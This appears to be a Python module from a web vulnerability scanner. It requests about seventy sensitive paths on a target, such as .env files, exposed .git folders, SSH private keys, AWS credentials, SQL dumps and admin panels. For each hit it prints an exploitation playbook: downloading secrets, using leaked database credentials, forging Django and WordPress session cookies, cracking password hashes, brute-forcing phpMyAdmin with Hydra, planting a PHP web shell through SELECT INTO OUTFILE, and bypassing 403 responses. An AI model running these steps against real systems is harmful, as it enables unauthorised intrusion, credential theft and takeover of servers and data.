from core.utils import make_request, print_finding, print_status, print_info

MODULE = "SensitiveFiles"

SENSITIVE_PATHS = [
    (".env", "CRITICAL", "Environment file  - may contain API keys, passwords, DB credentials"),
    (".env.local", "CRITICAL", "Local environment file  - may contain secrets"),
    (".env.production", "CRITICAL", "Production environment file  - likely contains live secrets"),
    (".env.backup", "CRITICAL", "Environment backup  - may contain secrets"),
    (".git/HEAD", "CRITICAL", "Git repository exposed  - source code leak"),
    (".git/config", "CRITICAL", "Git config exposed  - may contain remote URLs and credentials"),
    (".git/COMMIT_EDITMSG", "HIGH", "Git commit message exposed"),
    (".git/logs/HEAD", "HIGH", "Git log exposed  - reveals commit history"),
    (".svn/entries", "HIGH", "SVN repository exposed"),
    (".svn/wc.db", "HIGH", "SVN working copy database exposed"),
    (".htaccess", "MEDIUM", "Apache config exposed"),
    (".htpasswd", "CRITICAL", "Apache password file exposed"),
    ("wp-config.php.bak", "CRITICAL", "WordPress config backup  - database credentials"),
    ("wp-config.php~", "CRITICAL", "WordPress config backup (tilde)  - database credentials"),
    ("web.config", "HIGH", "IIS configuration file exposed"),
    ("web.config.bak", "HIGH", "IIS configuration backup exposed"),
    ("robots.txt", "INFO", "Robots file found  - may reveal hidden paths"),
    ("phpinfo.php", "HIGH", "PHP info page exposed  - reveals server configuration"),
    ("info.php", "HIGH", "PHP info page exposed"),
    ("php.php", "HIGH", "PHP info page exposed"),
    ("test.php", "MEDIUM", "PHP test file exposed"),
    ("server-status", "HIGH", "Apache server status exposed"),
    ("server-info", "HIGH", "Apache server info exposed"),
    (".bash_history", "CRITICAL", "Bash history exposed  - may contain passwords"),
    (".bash_profile", "HIGH", "Bash profile exposed  - may contain credentials"),
    (".ssh/id_rsa", "CRITICAL", "SSH private key exposed"),
    (".ssh/id_rsa.pub", "HIGH", "SSH public key exposed"),
    ("backup.sql", "CRITICAL", "SQL backup file found"),
    ("dump.sql", "CRITICAL", "SQL dump file found"),
    ("database.sql", "CRITICAL", "Database file found"),
    ("db.sql", "CRITICAL", "Database SQL file found"),
    ("backup.zip", "HIGH", "Backup archive found"),
    ("backup.tar.gz", "HIGH", "Backup archive found"),
    ("backup.tar", "HIGH", "Backup archive found"),
    ("site.tar.gz", "HIGH", "Site backup archive found"),
    ("www.zip", "HIGH", "Web root backup found"),
    (".dockerenv", "MEDIUM", "Docker environment file"),
    ("docker-compose.yml", "HIGH", "Docker compose config  - may reveal services and credentials"),
    ("docker-compose.yaml", "HIGH", "Docker compose config  - may reveal services and credentials"),
    ("Dockerfile", "MEDIUM", "Dockerfile exposed  - reveals build process"),
    (".npmrc", "HIGH", "NPM config  - may contain auth tokens for private registries"),
    (".aws/credentials", "CRITICAL", "AWS credentials exposed"),
    ("config/database.yml", "CRITICAL", "Rails database config  - may contain DB credentials"),
    ("config/secrets.yml", "CRITICAL", "Rails secrets file  - contains secret key base"),
    ("application.properties", "HIGH", "Spring Boot config  - may contain DB/API credentials"),
    ("application.yml", "HIGH", "Spring Boot YAML config  - may contain secrets"),
    ("settings.py", "HIGH", "Django settings  - may contain SECRET_KEY and DB credentials"),
    ("local_settings.py", "CRITICAL", "Django local settings  - likely contains production secrets"),
    ("wp-login.php", "MEDIUM", "WordPress login page found - brute force target"),
    ("administrator/", "MEDIUM", "Admin panel found - brute force target"),
    ("admin/", "MEDIUM", "Admin panel found - brute force target"),
    ("login/", "MEDIUM", "Login page found - brute force target"),
    ("phpmyadmin/", "HIGH", "phpMyAdmin found  - database management interface"),
    ("pma/", "HIGH", "phpMyAdmin (pma) found  - database management interface"),
    ("adminer.php", "HIGH", "Adminer found  - database management interface"),
    ("api/", "MEDIUM", "API endpoint found - test for auth bypass and IDOR"),
    ("graphql", "MEDIUM", "GraphQL endpoint found  - may allow introspection"),
    ("swagger.json", "MEDIUM", "Swagger/OpenAPI spec exposed  - full API documentation"),
    ("swagger.yaml", "MEDIUM", "Swagger/OpenAPI YAML spec exposed"),
    ("openapi.json", "MEDIUM", "OpenAPI spec exposed  - full API documentation"),
    ("api-docs/", "MEDIUM", "API documentation exposed"),
    ("v1/", "MEDIUM", "API v1 endpoint found - test for auth bypass and IDOR"),
    ("v2/", "MEDIUM", "API v2 endpoint found - test for auth bypass and IDOR"),
    ("debug/", "HIGH", "Debug endpoint found"),
    ("console", "HIGH", "Console endpoint found  - may allow code execution"),
    ("trace.axd", "HIGH", "ASP.NET trace exposed"),
    ("elmah.axd", "HIGH", "ELMAH error log exposed"),
    ("_profiler/", "MEDIUM", "Symfony profiler exposed  - reveals request details"),
    ("laravel-debug-bar", "MEDIUM", "Laravel debug bar exposed"),
]


EXPLOITATION_MAP = {
    ".env": (
        "1. Download: curl {url}\n"
        "2. Look for: DB_PASSWORD, API_KEY, SECRET_KEY, AWS credentials\n"
        "3. Use DB credentials to connect: mysql -h <host> -u <user> -p<password>\n"
        "4. Use API keys to access third-party services (Stripe, AWS, SendGrid)\n"
        "5. Use SECRET_KEY to forge session tokens or JWT signatures"
    ),
    ".git/HEAD": (
        "1. Download the entire git repo: git-dumper {base_url}/.git/ ./dumped_repo\n"
        "2. Tool: https://github.com/arthaud/git-dumper\n"
        "3. Read source code for hardcoded secrets: grep -r 'password\\|secret\\|key' .\n"
        "4. Check git history for removed secrets: git log --all -p | grep -i password\n"
        "5. Reconstruct full source code and find logic vulnerabilities"
    ),
    ".git/config": (
        "1. Download: curl {url}\n"
        "2. Look for remote URLs with embedded credentials\n"
        "3. May contain GitHub tokens or SSH key references\n"
        "4. Use to clone the private repository"
    ),
    ".htpasswd": (
        "1. Download: curl {url}\n"
        "2. Contains username:hash pairs for HTTP Basic Auth\n"
        "3. Crack with hashcat: hashcat -m 1600 hashes.txt wordlist.txt\n"
        "4. Or John: john --format=md5crypt hashes.txt\n"
        "5. Use cracked credentials to access protected areas"
    ),
    "wp-config.php.bak": (
        "1. Download: curl {url}\n"
        "2. Contains MySQL database credentials in plaintext\n"
        "3. Connect to database: mysql -h <DB_HOST> -u <DB_USER> -p<DB_PASSWORD>\n"
        "4. Contains WordPress secret keys  - can forge admin cookies\n"
        "5. May contain SMTP credentials for sending phishing emails"
    ),
    "phpinfo.php": (
        "1. Visit {url}  - reveals complete server configuration\n"
        "2. Check for: document_root, include_path, disabled_functions\n"
        "3. Find file upload temp directory for LFI attacks\n"
        "4. Check PHP version for known CVEs\n"
        "5. Look for loaded extensions that may have vulnerabilities"
    ),
    "backup.sql": (
        "1. Download: curl -O {url}\n"
        "2. Contains full database dump  - all tables, users, passwords\n"
        "3. Extract credentials: grep -i 'INSERT INTO.*users' backup.sql\n"
        "4. Password hashes can be cracked with hashcat or john\n"
        "5. May contain PII, financial data, or other sensitive records"
    ),
    "phpmyadmin/": (
        "1. Access {url}  - database management interface\n"
        "2. Try default credentials: root/(empty), root/root, admin/admin\n"
        "3. Brute force with Hydra: hydra -l root -P wordlist.txt {host} http-post-form\n"
        "4. If access gained: full database control  - read, modify, delete all data\n"
        "5. Execute SQL: SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'"
    ),
    "robots.txt": (
        "1. Read {url} for disallowed paths\n"
        "2. Disallowed paths often reveal admin panels, staging areas, API endpoints\n"
        "3. Visit each disallowed path to find hidden functionality\n"
        "4. Look for: /admin, /backup, /staging, /api/internal"
    ),
    "swagger.json": (
        "1. Download: curl {url}\n"
        "2. Full API documentation  - all endpoints, parameters, and auth methods\n"
        "3. Test each endpoint for authentication bypasses\n"
        "4. Look for admin-only endpoints accessible without auth\n"
        "5. Test for IDOR by manipulating ID parameters"
    ),
    ".ssh/id_rsa": (
        "1. Download: curl {url}\n"
        "2. Save the private key and set permissions: chmod 600 id_rsa\n"
        "3. SSH into the server: ssh -i id_rsa user@{host}\n"
        "4. If key is passphrase protected, crack it: ssh2john id_rsa | john --wordlist=rockyou.txt\n"
        "5. Use the key to access other servers that trust this key"
    ),
    ".npmrc": (
        "1. Download: curl {url}\n"
        "2. Look for _authToken for private npm registries\n"
        "3. Use token to download private packages: npm install --registry https://registry.npmjs.org\n"
        "4. Private packages may contain proprietary code or additional secrets\n"
        "5. Token may also work with GitHub Packages registry"
    ),
    "settings.py": (
        "1. Download: curl {url}\n"
        "2. Extract SECRET_KEY  - can forge Django session cookies and CSRF tokens\n"
        "3. Forge admin session: use django.core.signing with the SECRET_KEY\n"
        "4. Extract DATABASES settings  - direct DB access\n"
        "5. Look for third-party API keys (Stripe, AWS, etc.)"
    ),
    "graphql": (
        "1. Test introspection: POST {url} with query '{__schema{types{name}}}'\n"
        "2. If introspection enabled: dump full schema with InQL or graphql-voyager\n"
        "3. Test for authentication bypass on sensitive queries/mutations\n"
        "4. Test for IDOR: query other users' data by changing ID fields\n"
        "5. Test for SQL injection inside resolver arguments\n"
        "6. Tool: graphql-cop for automated GraphQL security testing"
    ),
}


def _get_exploitation(path, url, base_url):
    """Get exploitation steps for a specific file/path."""
    for key, template in EXPLOITATION_MAP.items():
        if key in path:
            return template.format(url=url, base_url=base_url, host=base_url.replace("https://", "").replace("http://", ""))
    return (
        f"1. Access: curl {url}\n"
        f"2. Analyze the response for sensitive information\n"
        f"3. Look for credentials, API keys, internal paths, or configuration data\n"
        f"4. Use discovered information for further exploitation"
    )


def _detect_waf_baseline(base_url):
    """
    Request a path that definitely doesn't exist.
    If the server returns 403 for a non-existent path, then all 403s
    are from a WAF (e.g. Cloudflare) blocking everything — not real findings.
    Returns the status code of the baseline non-existent path.
    """
    import uuid
    fake_path = f"/{uuid.uuid4().hex}-doesnotexist"
    resp = make_request(f"{base_url}{fake_path}")
    if resp is None:
        return None
    return resp.status_code


def scan(target_url, crawl_data):
    print_status("Checking for sensitive files and directories...")
    findings = []

    base_url = target_url.rstrip("/")

    # Baseline check — if a non-existent path returns 403, WAF is blocking everything
    baseline_status = _detect_waf_baseline(base_url)
    waf_blocking_403 = (baseline_status == 403)
    if waf_blocking_403:
        print_info("WAF baseline: non-existent path returns 403 — skipping false-positive 403 findings")

    for path, severity, description in SENSITIVE_PATHS:
        url = f"{base_url}/{path}"
        resp = make_request(url)

        if resp is None:
            continue

        if resp.status_code == 200 and len(resp.text) > 0:
            if _is_likely_real(resp, path):
                finding = {
                    "severity": severity,
                    "module": MODULE,
                    "type": f"Sensitive File/Directory: {path}",
                    "url": url,
                    "parameter": "",
                    "payload": "",
                    "evidence": f"HTTP {resp.status_code} | Size: {len(resp.text)} bytes",
                    "description": description,
                    "exploitation": _get_exploitation(path, url, base_url),
                }
                findings.append(finding)
                print_finding(severity, MODULE,
                              f"Found: /{path}",
                              url=url,
                              detail=description)
        elif resp.status_code == 403 and not waf_blocking_403:
            # Only report 403 if the WAF isn't blanket-blocking all paths
            finding = {
                "severity": "MEDIUM",
                "module": MODULE,
                "type": f"Protected File/Directory: {path}",
                "url": url,
                "parameter": "",
                "payload": "",
                "evidence": "HTTP 403 Forbidden — file exists but access denied (confirmed: non-existent paths return 404)",
                "description": f"{description} (access restricted, but file exists on server)",
                "exploitation": (
                    f"1. File exists but is access-restricted (403 Forbidden)\n"
                    f"2. Try path bypass techniques: {url}%00, {url}/, {url}..;/\n"
                    f"3. Try HTTP method override: curl -X POST {url}\n"
                    f"4. Try adding headers: X-Original-URL: /{path} or X-Rewrite-URL: /{path}\n"
                    f"5. Check for backup copies: {url}.bak, {url}.old, {url}~\n"
                    f"6. Try with different case: {url.upper()}, {url.lower()}"
                ),
            }
            findings.append(finding)
            print_finding("MEDIUM", MODULE,
                          f"Protected: /{path} (403 — real, not WAF)",
                          url=url,
                          detail="File exists but access is denied")

    return findings


def _is_likely_real(resp, path):
    """Filter out soft 404s and generic error pages."""
    content = resp.text.lower()

    false_positives = ["page not found", "404", "not found", "error 404", "does not exist"]
    for fp in false_positives:
        if fp in content and len(content) < 5000:
            return False

    if path == ".git/HEAD" and "ref:" not in content:
        return False
    if path.startswith(".git/") and len(content) < 3:
        return False
    if path.startswith(".env") and len(content) < 20:
        return False
    if path == "robots.txt" and ("user-agent" in content or "disallow" in content or "sitemap" in content):
        return True
    if path == "robots.txt":
        return False
    if path.endswith(".sql") and "insert" not in content and "create" not in content and "select" not in content:
        return False
    if path == ".ssh/id_rsa" and "begin" not in content:
        return False

    return True
